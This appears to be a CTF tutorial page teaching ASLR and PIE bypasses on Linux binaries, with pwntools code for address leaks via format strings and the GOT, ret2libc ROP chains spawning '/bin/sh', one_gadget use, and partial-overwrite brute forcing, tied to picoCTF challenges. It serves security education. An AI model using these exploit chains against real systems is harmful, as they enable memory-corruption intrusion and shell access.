@@ -1,0 +1,880 @@
+## Introduction
+
+You find a buffer overflow. You know the offset. You pack a beautiful payload. You hit enter and get `Segmentation fault`. Every. Single. Time. Welcome to ASLR and PIE - the two mitigations that turn a trivial overflow into a multi-step exploit.
+
+**ASLR** (Address Space Layout Randomization) randomizes where the stack, heap, and shared libraries land in memory at every run. **PIE** (Position-Independent Executable) extends this to the binary itself. Together they mean you cannot hardcode any address - the address of `system()`, the address of `/bin/sh`, even the address of the `win()` function you found in Ghidra - all change every execution.
+
+This guide teaches you exactly how to break through both of them. You will learn to read checksec output, leak runtime addresses, build ret2libc ROP chains, use one_gadget, and handle the 64-bit stack alignment trap that silently kills otherwise correct exploits. Every technique is demonstrated with real pwntools code, not pseudocode.
+
+This guide assumes you already understand basic stack buffer overflows. If you need that foundation first, read the [Buffer Overflow guide](https://picoctfsolutions.com/posts/buffer-overflow-binary-exploitation-ctf) before continuing here.
+
+Format string leakMedium
+
+When: Binary has printf(user_input) - leak libc or PIE address
+
+puts/printf libc leakMedium
+
+When: Binary calls puts/printf - use GOT entry to leak libc base
+
+ret2libc ROP chainMedium
+
+When: NX enabled, ASLR present - call system('/bin/sh') via ROP
+
+PIE partial overwriteHard
+
+When: PIE enabled, 32-bit or predictable last byte - low 12 bits fixed, brute force the random bits above
+
+one_gadgetEasy
+
+When: libc base known - single gadget spawns shell, no ROP chain needed
+
+Binary-provided leakEasy
+
+When: The binary prints an address - compute base from known offset
+
+## What is ASLR?
+
+ASLR is a kernel-level defense that randomizes the load addresses of memory regions each time a program runs. Before ASLR, every run of the same binary loaded `libc` at the same address, so an attacker could hardcode `system()`'s address into a payload. With ASLR, `libc` loads at a different base address on each execution, making hardcoded addresses useless.
+
+The whole policy lives in one file. The kernel's [`kernel.randomize_va_space` sysctl](https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html) takes three values: **0** off, **1** for stack, mmap, and VDSO, and **2** (the distribution default) adding the heap. On x86-64 the mmap region gets **28 bits** of entropy by default, which is **268 million** possible libc bases: enough that blind guessing is not a technique, only a leak is. Checking `cat /proc/sys/kernel/randomize_va_space` on the challenge host is worth doing, because a value of 0 turns this entire page into an afternoon off.
+
+It was not always this strong. Linux merged ASLR into the mainline kernel in **2.6.12 (2005)**, following PaX, and on 32-bit x86 the mmap base had only **16** useful bits. [Shacham and co-authors demonstrated in 2004](https://hovav.net/ucsd/papers/sppgmb04.html) that this was brute-forceable against a live Apache server in an average of **216 seconds**. The move to 64-bit address space, not randomization by itself, is what made ASLR worth relying on.
+
+### What gets randomized
+
+ASLR randomizes the starting addresses of three memory regions:
+
+```
+# Memory map of a running process (simplified)
+[stack]       0x7fff???????? 0000  <- randomized each run
+[heap]        0x55??????????        <- randomized each run
+libc.so.6     0x7f??????????        <- randomized each run
+ld-linux.so   0x7f??????????        <- randomized each run
+
+# Note: the binary's own code (text segment) is NOT randomized
+# by ASLR alone - that requires PIE (see next section)
+```
+
+### Checking ASLR on the system
+
+The kernel exposes ASLR settings through `/proc/sys/kernel/randomize_va_space`:
+
+```
+cat /proc/sys/kernel/randomize_va_space
+# 0 = ASLR disabled (no randomization)
+# 1 = partial (stack, VDSO, mmap and shared libraries randomized; heap/brk not)
+# 2 = full ASLR (default on modern Linux - stack, heap, libs, mmap all random)
+
+# Temporarily disable ASLR for debugging (your own machine only):
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+
+# Or disable just for one process with setarch:
+setarch $(uname -m) -R ./binary
+```
+
+### How random is it really?
+
+On a 64-bit Linux system, ASLR randomizes approximately 28 bits of the stack and library base addresses, and about 12-28 bits of the heap. This is enough to make blind brute-force impractical. However, the randomization is applied in units of pages (4096 bytes), so the lowest 12 bits of any address are always zero and never randomized. This matters for the partial overwrite technique described later.
+
+Key insight: ASLR only randomizes the *base* of each region. Once you know any single address inside a region (a leak), you know the base of the entire region because the offsets between symbols within a library are fixed at compile time.
+
+## What is PIE?
+
+PIE stands for Position-Independent Executable. A PIE binary is compiled so that it can run at any load address, not just the fixed address it was linked at. When both ASLR and PIE are active, the binary's own code segment gets a random base address, just like shared libraries.
+
+The switch is a single field in the file header. Per the [ELF specification](https://refspecs.linuxfoundation.org/elf/elf.pdf), a non-PIE executable has `e_type` set to `ET_EXEC` (value **2**) and carries absolute addresses, while a PIE binary is `ET_DYN` (value **3**), the same type as a shared library, and is linked at base `0` with everything expressed as an offset. You can confirm which you have in one command with `readelf -h ./binary | grep Type`, which is faster and more definitive than reading checksec output.
+
+Without PIE, the binary's text segment always loads at a fixed address (typically `0x400000` on x86-64). With PIE enabled, it loads somewhere random like `0x55a3f1b42000`. The `win()` function that Ghidra shows at offset `0x1234` is now at `0x55a3f1b42000 + 0x1234 = 0x55a3f1b43234`, which you cannot know without a leak.
+
+### PIE vs. ASLR: what is the difference?
+
+```
+# Without PIE (ASLR on, PIE off):
+Binary text:    0x400000 (fixed - you can read this from objdump)
+Binary data:    0x601000 (fixed)
+libc:           0x7f???????? (random - need a leak)
+
+# With PIE (ASLR on, PIE on):
+Binary text:    0x5??????????0 (random - need a leak)
+Binary data:    0x5??????????0 (random)
+libc:           0x7f????????   (random - need a separate or combined leak)
+```
+
+### How PIE binary addresses work
+
+A PIE binary is essentially a shared library for its own code. Ghidra and objdump show addresses relative to the binary's load base (usually starting at `0x0000` in the disassembly). At runtime, the kernel chooses a random base (aligned to a 4096-byte page), and every address in the binary is that base plus the offset you see in the disassembler.
+
+```
+# In Ghidra/objdump you see:
+0x00001234  <win>: push rbp
+
+# At runtime (PIE enabled):
+binary_base = 0x555555554000   # chosen by kernel, different each run
+win_at_runtime = binary_base + 0x1234 = 0x555555555234
+
+# Once you have a single leak from the binary's text segment:
+# e.g., you leaked 0x555555555678 which is at offset 0x1678 in the binary
+binary_base = leaked_addr - 0x1678
+win_addr    = binary_base + 0x1234
+```
+
+Identifying PIE from checksec
+
+Run `checksec --file=./binary` and look for `PIE enabled` or `PIE disabled`. When disabled, addresses you find in objdump are the actual runtime addresses. When enabled, they are only offsets from an unknown base.
+
+## NX / DEP: non-executable stack
+
+**NX** (No-eXecute) - also called DEP (Data Execution Prevention) on Windows - marks the stack and heap as non-executable memory. When NX is enabled, the CPU will refuse to execute code that lives in these regions, raising a fault instead. The enforcement is one bit of hardware: AMD added the NX bit as **bit 63** of the page table entry in the original AMD64 design, Intel shipped the same thing under the name XD, and Linux gained support in **2.6.8 (2004)**. On an ELF binary the switch is the `PT_GNU_STACK` program header: if its flags include `E`, the stack is executable and shellcode still works. Check with `readelf -l ./binary | grep -A1 GNU_STACK`.
+
+This kills the classic shellcode-injection attack where you wrote `execve` shellcode into a stack buffer and jumped to it. With NX, jumping to the stack just crashes the process.
+
+### Why NX leads to ret2libc
+
+NX prevents injecting *new* code, but it does not prevent reusing code that already exists in executable memory. The libc shared library, which is always mapped as executable, contains `system()` and a string `/bin/sh`. You do not need to inject shellcode - you can chain together existing executable code fragments (gadgets) to call `system("/bin/sh")`. This is the heart of both ret2libc and the broader ROP (Return-Oriented Programming) technique.
+
+The escalation from "call one libc function" to "compute anything" has a specific origin. [Shacham's 2007 paper](https://hovav.net/ucsd/papers/s07.html) showed that the x86 instruction set is dense and unaligned enough that useful gadgets can be found by jumping into the *middle* of existing instructions, and that the resulting gadget set in a standard libc is **Turing-complete**. That result is why NX did not end memory-corruption exploitation, and why every mitigation after it (ASLR, CFI, shadow stacks) targets control flow rather than writable memory.
+
+```
+# NX enabled - shellcode injection fails:
+payload = b'A' * 44 + shellcode_addr  # CRASH: stack is not executable
+
+# NX enabled - ret2libc works because system() lives in executable libc:
+payload = b'A' * 44 + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
+# ^^^ Every address here points into executable memory - NX does not block this
+```
+
+Remember: NX is almost always enabled in CTF challenges (and real binaries). Assume shellcode injection will not work unless checksec explicitly shows `NX disabled`. The standard approach with NX enabled is ret2libc via a ROP chain.
+
+## Reading checksec output
+
+`checksec` is the first tool you run on every new CTF binary. It reports which security mitigations are compiled in, which tells you exactly which attack paths are available.
+
+### Install and run
+
+```
+# Install (comes with pwntools, or standalone)
+pip install pwntools
+sudo apt install checksec
+
+# Run on a binary
+checksec --file=./vuln
+
+# Or directly from pwntools in your script
+from pwn import *
+elf = ELF('./vuln')   # prints checksec output automatically
+```
+
+### Example: PIE-enabled binary
+
+Here is real checksec output for a PIE-enabled binary with NX and full RELRO:
+
+```
+$ checksec --file=./pie_challenge
+
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+```
+
+### What each field means for your exploit
+
+| Field | Value           | Impact on exploit                                                        |
+|-------|-----------------|--------------------------------------------------------------------------|
+| RELRO | Full            | GOT is read-only - cannot overwrite GOT entries for arbitrary write      |
+| RELRO | Partial         | GOT is writable - overwriting GOT entries is a valid technique           |
+| Stack | Canary found    | Must leak or brute-force the canary before overwriting return address    |
+| Stack | No canary found | Overflow the return address directly with no canary obstacle             |
+| NX    | NX enabled      | Stack is not executable - must use ret2libc or ROP instead of shellcode  |
+| NX    | NX disabled     | Stack is executable - shellcode injection works                          |
+| PIE   | PIE enabled     | Binary loads at random base - need a leak from the binary's text segment |
+| PIE   | PIE disabled    | Binary always loads at fixed address (e.g., 0x400000) - no leak needed   |
+
+### Practical decision flow from checksec
+
+```
+PIE disabled, NX disabled  -> ret2win or shellcode injection
+PIE disabled, NX enabled   -> ret2libc without needing a PIE leak
+                              (binary addresses still hardcoded)
+PIE enabled,  NX disabled  -> leak PIE base, then jump to shellcode on stack
+PIE enabled,  NX enabled   -> leak PIE base AND libc base, then ret2libc
+                              (most common CTF scenario)
+
+Canary found               -> add a canary leak step before any of the above
+```
+
+## Memory leak techniques
+
+A memory leak is any mechanism that reveals a runtime address to you. Once you have one runtime address from a region, you can compute every other address in that region because the offsets between symbols are fixed.
+
+### 1. Format string leaks
+
+If the binary passes user input directly to `printf`, you can use format specifiers to read stack values as pointers. The stack almost always contains return addresses from previous calls - these point into the binary's text segment or into libc, giving you both a PIE leak and a libc leak at the same time.
+
+```
+# Send a chain of %p to dump stack pointers
+python3 -c "print('%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')" | ./binary
+# Output: 0x1.(nil).0x7f3a1b2c3d4e.0x55a3f1b43234.0x1.0x3...
+#                    ^^^ libc addr        ^^^ PIE addr
+
+# Target a specific stack offset with positional argument:
+python3 -c "print('%6$p')" | ./binary   # prints the 6th pointer-sized value
+
+# In pwntools, automate by sending then parsing:
+p.sendline(b'%p.' * 20)
+leaks = p.recvline().decode().split('.')
+# Look for addresses in the 0x55... range (PIE) or 0x7f... range (libc)
+```
+
+For a complete walkthrough of format string vulnerabilities, see the [Format String guide](https://picoctfsolutions.com/posts/format-string-ctf).
+
+### 2. puts/printf libc leak via GOT
+
+If you can call `puts()` or `printf()` with an argument you control, you can pass it the address of a GOT entry. The GOT (Global Offset Table) stores the resolved runtime address of each libc function the binary calls. Printing a GOT entry leaks that function's runtime address in libc, from which you can compute the libc base.
+
+```
+# The GOT entry for puts() stores the runtime address of puts in libc.
+# If we can call puts(got['puts']), the program will print those 8 bytes.
+
+from pwn import *
+
+elf  = ELF('./binary')
+libc = ELF('./libc.so.6')   # same libc as remote - see pwntools section
+rop  = ROP(elf)
+
+# Step 1: leak puts() address by calling puts(got['puts'])
+# For x86-64: first argument goes in rdi, so we need a pop rdi ; ret gadget
+pop_rdi = rop.rdi.address
+
+offset = 44  # bytes to reach return address (find this with cyclic)
+
+# First payload: leak, then return to main to get another overflow
+payload  = b'A' * offset
+payload += p64(pop_rdi)
+payload += p64(elf.got['puts'])   # argument: address of puts GOT entry
+payload += p64(elf.plt['puts'])   # call puts() - prints the GOT entry
+payload += p64(elf.symbols['main'])  # loop back to main for round 2
+
+p.sendlineafter(b'Input: ', payload)
+
+# Parse the leak
+leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc_base   = leaked_puts - libc.symbols['puts']
+log.success(f'libc base: {hex(libc_base)}')
+```
+
+### 3. Binary-provided leak (gift leak)
+
+Many picoCTF challenges helpfully print an address for you. The PIE TIME challenge literally prints the address of a function. This is a gift - parse it and compute your base immediately.
+
+```
+# Binary prints something like: 'Here is your gift: 0x55a3f1b43234'
+p.recvuntil(b'0x')
+leaked_addr = int(p.recvline().strip(), 16)
+
+# If you know the leaked address is the 'main' function:
+binary_base = leaked_addr - elf.symbols['main']
+
+# Now rebase the ELF object so all symbols are correct
+elf.address = binary_base
+win_addr    = elf.symbols['win']   # automatically rebased
+```
+
+### 4. GOT dereferencing
+
+Even without a format string vulnerability, if you can control a pointer that gets passed to `puts()` or `write()`, passing a GOT address leaks the libc runtime address of any function the binary has already called.
+
+```
+# Identify GOT entries for functions the binary calls:
+objdump -d ./binary | grep -A2 '@plt'
+# or in pwntools:
+print(elf.got)   # {'puts': 0x601018, 'printf': 0x601020, ...}
+
+# After leaking:
+leaked_puts  = <parse from output>
+libc_base    = leaked_puts - libc.symbols['puts']
+system_addr  = libc_base + libc.symbols['system']
+bin_sh_addr  = libc_base + next(libc.search(b'/bin/sh'))
+```
+
+Tip: When you receive a leak, sanity-check it before proceeding. A libc address on a 64-bit system typically starts with `0x7f`. A PIE binary address typically starts with `0x55` or `0x56`. If your parsed leak looks wrong, you may be off by a null byte - try `ljust(8, b'\x00')` when unpacking with `u64()`.
+
+## ret2libc: calling system('/bin/sh')
+
+ret2libc is the go-to exploit when NX is enabled and you have (or can obtain) a libc address leak. Instead of injecting shellcode, you build a ROP chain that calls`system("/bin/sh")` using code that already exists in the executable libc library. The ASLR-specific half of this is everything above: leak a libc pointer, subtract the symbol offset to recover the libc base, then rebase every address you need. Once you have the base, the chain itself is short.
+
+```
+# after leaking libc_base (see the leak section above):
+libc.address = libc_base
+system_addr  = libc.symbols['system']
+bin_sh_addr  = next(libc.search(b'/bin/sh'))
+ret          = rop.find_gadget(['ret'])[0]
+pop_rdi      = rop.find_gadget(['pop rdi', 'ret'])[0]
+
+payload  = b'A' * OFFSET
+payload += p64(ret)          # 16-byte stack alignment (64-bit)
+payload += p64(pop_rdi)
+payload += p64(bin_sh_addr)  # rdi = '/bin/sh'
+payload += p64(system_addr)  # call system()
+```
+
+Two details bite everyone: getting the exact matching libc so the symbol offsets are right, and the 64-bit stack alignment trap. If you segfault *inside* `system()` rather than at the `ret`, the stack was not 16-byte aligned at the `call`; add or remove one `ret` gadget to fix it. The full leak-then-exploit two-stage script, the alignment mechanics, and libc-matching are all covered end to end in the dedicated [ret2libc guide](https://picoctfsolutions.com/posts/ret2libc-ctf). This page stays focused on the ASLR and PIE half: getting the leak in the first place.
+
+For the foundational buffer overflow knowledge that ret2libc builds on, see the [Buffer Overflow guide](https://picoctfsolutions.com/posts/buffer-overflow-binary-exploitation-ctf).
+
+## pwntools workflow for ASLR/PIE
+
+pwntools is the standard Python exploitation library for CTF. These are the specific patterns you need for ASLR/PIE bypasses, beyond the basics.
+
+### ELF and rebasing
+
+```
+from pwn import *
+
+# Load binary and libc
+elf  = context.binary = ELF('./vuln')   # sets context.arch automatically
+libc = ELF('./libc.so.6')
+
+# After you receive a leak and compute bases:
+elf.address  = binary_base   # rebase - all elf.symbols now give runtime addrs
+libc.address = libc_base     # rebase - all libc.symbols now give runtime addrs
+
+# pwntools ROP object uses these bases automatically after rebasing:
+rop = ROP([elf, libc])
+rop.find_gadget(['pop rdi', 'ret'])
+```
+
+### Finding the overflow offset with cyclic
+
+```
+# Step 1: generate a cyclic pattern and send it to the binary
+python3 -c "from pwn import *; print(cyclic(200).decode())" | ./vuln
+# The binary crashes. Note the value in RIP/RSP.
+
+# Step 2: find the offset
+python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"  # -> 44
+
+# Or let GDB print it for you (run under GDB, then):
+# (gdb) info registers rsp
+# rsp  0x7fff...  -> read the 4 bytes at rsp
+# (gdb) x/wx $rsp
+# -> 0x6161616c  (cyclic pattern)
+# python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
+```
+
+### Finding the right libc version
+
+The libc offset from base to `system()` varies between versions. Getting the wrong libc means wrong offsets and a crash. Two tools help:
+
+```
+# Option 1: libc database - provide leaked function addresses
+# Visit https://libc.rip or use the git-clone CLI tool:
+git clone https://github.com/niklasb/libc-database && cd libc-database && ./get
+./find puts 0x7f...abc0  # finds matching libc version
+
+# Option 2: pwntools libc database (searches local cache)
+from pwnlib.libcdb import search_by_symbol_offsets
+
+# Option 3: download the remote libc
+# Many challenges provide the libc.so.6 as a download attachment.
+# If not, and you can read /proc/self/maps, grep for the libc path
+# and exfiltrate it, or use 'ldd ./binary' to see which libc is linked.
+
+# Verify your libc match by checking multiple function offsets:
+print(hex(libc.symbols['puts']))    # should match what you leaked
+print(hex(libc.symbols['printf']))  # cross-check a second function
+```
+
+### pwntools struct packing
+
+```
+p64(addr)         # pack as 8-byte little-endian (x86-64)
+p32(addr)         # pack as 4-byte little-endian (x86)
+u64(data)         # unpack 8 bytes to integer
+u32(data)         # unpack 4 bytes to integer
+
+# flat() for building payloads inline:
+payload = flat(
+    b'A' * 44,
+    ret_gadget,     # alignment
+    pop_rdi,        # gadget address
+    bin_sh_addr,    # '/bin/sh' string
+    system_addr,    # system()
+)
+```
+
+### Process interaction patterns
+
+```
+p = process('./vuln')          # local
+p = remote('host', 1337)       # remote
+
+# Sending
+p.send(payload)                # raw send
+p.sendline(payload)            # send + b'\n'
+p.sendlineafter(b'> ', payload)  # wait for prompt, then send
+
+# Receiving
+p.recvline()                   # receive until newline
+p.recvuntil(b'0x')             # receive until marker, discard marker
+p.recv(8)                      # receive exactly 8 bytes
+line = p.recvline().strip()    # strip trailing whitespace/newlines
+
+# Parsing leaks
+leaked = int(p.recvline().strip(), 16)        # if printed as hex
+leaked = u64(p.recv(8))                       # if printed as raw bytes
+leaked = u64(p.recvline().strip().ljust(8, b'\x00'))  # if truncated at null
+
+# Hand off to interactive terminal (after shell)
+p.interactive()
+```
+
+## PIE partial overwrite
+
+When PIE is enabled but you cannot trigger a clean memory leak, there is another option: the partial overwrite. Because ASLR randomizes in units of pages, and the x86-64 page size is **4,096** bytes, the lowest **12** bits of a load base are always zero. On a 64-bit system that means the lowest **3** nibbles of any address are the file offset unchanged, and you already know them from `objdump`.
+
+Overwriting two bytes gives you 16 bits of target and leaves exactly **4** randomized bits in the upper nibble, so a blind attempt succeeds with probability **1 in 16** and a scripted loop lands it in a few seconds. That is the entire trade: the partial overwrite converts an unsolvable 28-bit problem into a 4-bit one, at the cost of needing the target to sit within the same 4 KB page as the value you are clobbering.
+
+### How it works on 32-bit / 16-bit overwrite scenarios
+
+```
+# PIE binary, function at offset 0x1234 within the page
+# At runtime, the binary might load at:
+# 0x55555554000, 0x56789ab4000, 0x5600abc4000, ...
+# But the last 12 bits (3 hex digits) of the function address
+# are ALWAYS 0x234 (from the 0x1234 offset into the page)
+
+# If you overwrite only the last 2 bytes of the return address
+# (by overflowing just 2 bytes beyond the buffer), you can
+# target the low 16 bits of the address:
+
+# Example: return address on stack is 0x55a3f1b4319a (current instruction)
+# You want to jump to 0x55a3f1b43234 (win function at offset 0x1234)
+# Last 2 bytes differ: 0x19a -> 0x234
+# But the top nibble of the 2nd byte is still random (4-bit brute force):
+
+# Brute force the 4 random bits (16 attempts on average)
+for guess in range(16):
+    two_byte_overwrite = (guess << 12) | 0x234
+    payload = b'A' * offset + p16(two_byte_overwrite)
+    # send and check if you got a shell
+```
+
+### When partial overwrite applies
+
+```
+Applies when:
+  - You can overflow the return address by 1 or 2 bytes only
+  - OR you are on a 32-bit system (only 8-12 bits of ASLR randomness)
+  - OR a NULL byte constraint limits your overwrite length
+
+Does NOT apply when:
+  - You need to jump to a function in a different page offset
+  - The overflow is full-length and you can write the full address
+    (in which case, just do a proper leak first)
+
+Success rate:
+  - 1-byte overwrite: deterministic (no brute force needed)
+  - 2-byte overwrite: 1/16 chance (4 random bits) - fast to brute force
+  - 3-byte overwrite: 1/4096 chance - usually too slow for CTF
+```
+
+Warning: Partial overwrite brute-forcing only works when the challenge allows repeated connection attempts. Remote CTF challenges usually do. If the service forks a new process per connection (rather than exec-ing), ASLR is re-randomized each connection, so your brute force is valid.
+
+## one_gadget: single-gadget shell
+
+Once you have the libc base address, the simplest way to get a shell is often a "magic gadget" - a single address in libc that, when jumped to, executes `execve("/bin/sh", NULL, NULL)` without any additional setup. The [`one_gadget`](https://github.com/david942j/one_gadget) tool finds these for you by symbolically checking, for every `execve` call site in the library, what register and memory state must hold for it to reach `/bin/sh`. A typical glibc yields **three to five** candidates, each with different constraints, which is why the tool prints the constraints alongside the offset: you pick the gadget whose preconditions your stack already satisfies rather than the first one listed.
+
+### Install and run
+
+```
+# Install (requires Ruby)
+gem install one_gadget
+
+# Find magic gadgets in a libc
+one_gadget ./libc.so.6
+
+# Example output:
+0x4f2c5 execve('/bin/sh', rsp+0x70, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f322 execve('/bin/sh', rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL || rsp+0x70 is a valid argv
+
+0x10a38c execve('/bin/sh', rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL || rsp+0x70 is a valid argv
+```
+
+### Using one_gadget in your exploit
+
+```
+from pwn import *
+
+libc = ELF('./libc.so.6')
+# ... (leak libc base, set libc.address = libc_base)
+
+# One_gadget offset found by running 'one_gadget ./libc.so.6'
+ONE_GADGET_OFFSET = 0x4f2c5
+one_gadget = libc.address + ONE_GADGET_OFFSET
+
+# Your ROP chain is now just a single address - no pop rdi, no /bin/sh
+payload = b'A' * OFFSET + p64(one_gadget)
+p.sendlineafter(b'Input: ', payload)
+p.interactive()
+```
+
+### What if the constraints are not met?
+
+Each one_gadget comes with constraints (registers or stack values that must be NULL or point to valid memory). If the first gadget in the list does not work, try the others. If none work, fall back to the full ret2libc ROP chain.
+
+```
+# Try each gadget offset from one_gadget output:
+GADGETS = [0x4f2c5, 0x4f322, 0x10a38c]
+
+for offset in GADGETS:
+    one_gadget = libc_base + offset
+    payload    = b'A' * OFFSET + p64(one_gadget)
+    p          = remote('host', 1337)
+    p.sendlineafter(b'Input: ', payload)
+    try:
+        p.sendline(b'id')
+        result = p.recvline(timeout=1)
+        if b'uid=' in result:
+            log.success(f'one_gadget 0x{offset:x} worked!')
+            p.interactive()
+            break
+    except:
+        log.warning(f'Gadget 0x{offset:x} failed, trying next...')
+    p.close()
+```
+
+## ROP gadgets: what they are and how to find them
+
+A **gadget** is a short sequence of instructions that already exists in the binary or a loaded library, ending with a `ret` instruction. By chaining gadgets together - each one returning into the next - you can build arbitrary computations out of code that is already executable, bypassing NX completely.
+
+This technique is called **ROP** (Return-Oriented Programming). Which registers you need to load is not a matter of taste: the [System V AMD64 ABI](https://gitlab.com/x86-psABIs/x86-64-ABI) passes the first **six** integer arguments in `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`, in that order, which is why `pop rdi ; ret` is the single most valuable gadget in 64-bit CTF: it sets argument one. On 32-bit i386 the arguments are on the stack instead, so a ret2libc chain there needs no gadgets at all, just addresses laid out in order. The most common gadgets for a 64-bit ret2libc are:
+
+```
+pop rdi ; ret   <- puts the next value from the stack into rdi (1st argument)
+pop rsi ; ret   <- 2nd argument
+pop rdx ; ret   <- 3rd argument
+ret             <- does nothing except pop rsp (used for alignment)
+leave ; ret     <- adjusts the stack frame (used in advanced ROP)
+```
+
+### Finding gadgets with ROPgadget
+
+```
+# Install
+pip install ROPgadget
+
+# Find all gadgets in a binary
+ROPgadget --binary ./vuln
+
+# Search for a specific gadget
+ROPgadget --binary ./vuln --re 'pop rdi'
+# Output:
+# 0x00000000004011c3 : pop rdi ; ret
+
+# Search in libc too
+ROPgadget --binary ./libc.so.6 --re 'pop rdi'
+
+# Find a plain 'ret' gadget for alignment
+ROPgadget --binary ./vuln --re '^ret$'
+```
+
+### Finding gadgets with pwntools ROP
+
+```
+from pwn import *
+
+elf = ELF('./vuln')
+rop = ROP(elf)
+
+# pwntools searches the binary for you
+pop_rdi = rop.rdi.address        # finds 'pop rdi ; ret'
+pop_rsi = rop.rsi.address        # finds 'pop rsi ; ret'
+ret     = rop.ret.address        # finds a plain 'ret'
+
+# Or search manually:
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+
+# Use with libc too:
+libc_rop = ROP(libc)
+pop_rdi_libc = libc_rop.rdi.address
+```
+
+### How a ROP chain executes
+
+```
+# Stack layout after overflowing the return address:
+# (stack grows downward, lower addresses at top)
+
+RSP ->  [ pop rdi ; ret ]   <- CPU jumps here (ret from vulnerable function)
+        [ /bin/sh address ] <- 'pop rdi' pops this into rdi, then 'ret' fires
+        [ ret gadget      ] <- alignment gadget, immediately returns again
+        [ system address  ] <- 'ret' from alignment gadget jumps here
+        (system is now called with rdi = /bin/sh - shell spawns)
+```
+
+For a deeper look at GDB techniques for building and debugging ROP chains, see the [GDB CTF Guide](https://picoctfsolutions.com/posts/gdb-ctf-guide).
+
+## GDB workflow: find offset, confirm overflow
+
+GDB is essential for developing ASLR/PIE exploits locally before attacking the remote service. Here is the exact sequence of GDB commands you need.
+
+### Install GDB with pwndbg (highly recommended)
+
+```
+# pwndbg adds CTF-specific commands: cyclic, vmmap, checksec, telescope
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg && ./setup.sh
+```
+
+### Step 1: disable ASLR for local testing
+
+```
+# Inside GDB:
+(gdb) set disable-randomization on    # pwndbg does this by default
+
+# Or system-wide (your own machine only):
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+### Step 2: find the overflow offset
+
+```
+# Generate a cyclic pattern
+(gdb) run $(python3 -c "from pwn import *; print(cyclic(200).decode())")
+
+# After crash, check where RSP points
+(gdb) x/wx $rsp
+# 0x7fffffffdc98:  0x6161616c
+
+# Back in shell, find the offset:
+python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
+# -> 44
+
+# Alternatively with pwndbg:
+(gdb) run <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
+(gdb) cyclic -l $rsp   # pwndbg command - prints offset directly
+```
+
+### Step 3: find function addresses
+
+```
+# In GDB, find win function address:
+(gdb) info functions win
+(gdb) p &win
+(gdb) disas win
+
+# Find where libc is loaded:
+(gdb) info proc mappings
+# or with pwndbg:
+(gdb) vmmap
+# Shows all loaded regions with addresses - note the libc base
+
+# Find system() and /bin/sh in libc:
+(gdb) p system
+(gdb) find &system, +9999999, '/bin/sh'
+```
+
+### Step 4: confirm your ROP chain
+
+```
+# Set a breakpoint on the return of the vulnerable function
+(gdb) break *vuln+123    # address of the 'ret' instruction
+
+# Send your payload and step through
+(gdb) run < payload.bin
+(gdb) ni                 # step one instruction (ret)
+(gdb) info registers rip # check RIP jumped to your gadget
+(gdb) ni                 # step: pop rdi
+(gdb) info registers rdi # check rdi = /bin/sh address
+(gdb) ni                 # step: ret
+(gdb) ni                 # step into system()
+
+# Check stack alignment before system():
+(gdb) p $rsp % 16       # must be 0 for proper alignment
+```
+
+### Step 5: confirm with PIE enabled
+
+```
+# With PIE enabled, addresses change each run even under GDB
+# unless you disable ASLR. Once ASLR is off, PIE loads at the same base.
+
+# After disabling randomization in GDB:
+(gdb) run
+(gdb) info proc mappings
+# Binary always loads at same base - addresses are now reproducible
+
+# To find the binary base:
+(gdb) info files
+# or
+(gdb) p &_start
+```
+
+Debugging segfaults: When you get a segfault in your exploit, the first thing to check is where it crashes. If it crashes at the `ret` of the vulnerable function, your offset is wrong or the address you wrote is invalid. If it crashes inside `system()`, it is almost always a stack alignment problem - add a `ret` gadget.
+
+## picoCTF challenges
+
+These picoCTF challenges directly apply the techniques in this guide. They are ordered from simplest leak to full ret2libc.
+
+PIE TIME (2025)
+
+[PIE TIME](https://picoctfsolutions.com/picoctf-2025-pie-time)
+
+PIE is enabled. The binary helpfully prints the address of `main()` at startup - a gift leak. Parse it, compute the binary base, add the offset to the win function, and return there. Perfect first PIE challenge.
+
+PIE TIME 2 (2025)
+
+[PIE TIME 2](https://picoctfsolutions.com/picoctf-2025-pie-time-2)
+
+Builds on PIE TIME. No gift leak this time - you must construct the leak yourself using the overflow. Requires understanding how to turn a controlled read or format string into a useful address.
+
+format string 3 (2024)
+
+[format string 3](https://picoctfsolutions.com/picoctf-2024-format-string-3)
+
+Format string vulnerability with PIE and ASLR enabled. Use a format string read to leak a libc address from the stack, compute the libc base, then overwrite a GOT entry or return address to call `system()`.
+
+high frequency troubles (2024)
+
+[high frequency troubles](https://picoctfsolutions.com/picoctf-2024-high-frequency-troubles)
+
+The two-stage leak-then-exploit shape at its hardest, and a warning that the leak half is not always a format string. It is a glibc 2.35 heap challenge with no `free()` anywhere and only one live chunk, so the libc leak comes from House of Orange (forcing the top chunk into the unsorted bin) rather than from a stack read. Only 31 teams solved it in 2024. Attempt it after the rest of this page is automatic.
+
+Study path: Start with PIE TIME (gift leak, no ROP needed). Then PIE TIME 2 (construct your own leak). Then format string 3 (format string as the leak primitive). Then high frequency troubles (full ret2libc with no hints). This progression builds each skill on the last.
+
+## Quick reference
+
+Use this as your checklist when you pick up a new binary exploitation challenge.
+
+### Scenario decision table
+
+| Scenario                                     | Technique                             | Key tool                        |
+|----------------------------------------------|---------------------------------------|---------------------------------|
+| Binary prints an address at startup          | Parse and compute binary_base         | elf.address = leaked - offset   |
+| Format string vulnerability (printf(input))  | %p chain to leak stack addresses      | %p.%p.%p or %N\$p               |
+| Overflow + PIE + NX, can call puts()         | puts(got\['puts'\]) to leak libc      | pop rdi + GOT entry + PLT puts  |
+| libc base known, want minimal ROP            | one_gadget - single address shell     | one_gadget ./libc.so.6          |
